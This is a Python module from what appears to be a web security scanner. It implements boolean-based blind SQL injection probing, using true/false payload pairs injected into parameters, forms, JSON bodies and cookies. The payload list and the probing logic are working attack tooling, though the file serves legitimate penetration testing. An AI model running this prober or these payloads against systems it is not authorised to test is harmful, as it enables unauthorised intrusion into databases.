"""Differential (blind) SQLi: boolean-based and time-based prober modules."""

from __future__ import annotations

from penpine.attack.models import Confidence, Finding, Payload

_SQLI_KINDS = ("param", "form", "json", "multipart", "cookie")


class DifferentialModule:
    """An active prober: drives its own sends and returns a Finding or None."""

    name = "differential"
    applies_to: tuple = ()
    select_attack_type: str | None = None

    def applies(self, kind: str) -> bool:
        return not self.applies_to or kind in self.applies_to

    async def probe(self, point, request, sender, *, baseline=None):
        raise NotImplementedError


def _similar(a, b, *, tolerance) -> bool:
    if a is None or b is None:
        return False
    if a.status_code != b.status_code:
        return False
    return abs(len(a.body.raw) - len(b.body.raw)) <= tolerance


BOOLEAN_PAYLOAD_PAIRS = [
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("' AND '1'='1", "' AND '1'='2"),
    (" AND 1=1", " AND 1=2"),
    (") AND 1=1-- -", ") AND 1=2-- -"),
]


class BooleanSqliModule(DifferentialModule):
    name = "sqli-boolean"
    select_attack_type = "sqli"
    applies_to = _SQLI_KINDS

    def __init__(self, pairs=None):
        self.pairs = list(pairs) if pairs is not None else list(BOOLEAN_PAYLOAD_PAIRS)

    async def probe(self, point, request, sender, *, baseline=None):
        base = baseline if baseline is not None else await sender.send(request)
        tolerance = max(32, len(base.body.raw) // 20)
        for true_payload, false_payload in self.pairs:
            rt = await sender.send(request.replace_at(point.expr, true_payload))
            rf = await sender.send(request.replace_at(point.expr, false_payload))
            if _similar(rt, base, tolerance=tolerance) and not _similar(
                rf, base, tolerance=tolerance
            ):
                return Finding(
                    attack_type="sqli-boolean",
                    point=point,
                    payload=Payload(true_payload, technique="boolean-blind"),
                    confidence=Confidence.HIGH,
                    evidence=(
                        f"boolean-based blind SQLi: TRUE ({true_payload!r}) matched baseline, "
                        f"FALSE ({false_payload!r}) differed"
                    ),
                    request=request.replace_at(point.expr, true_payload),
                    response=rt,
                )
        return None


BOOLEAN_SQLI_MODULE = BooleanSqliModule()
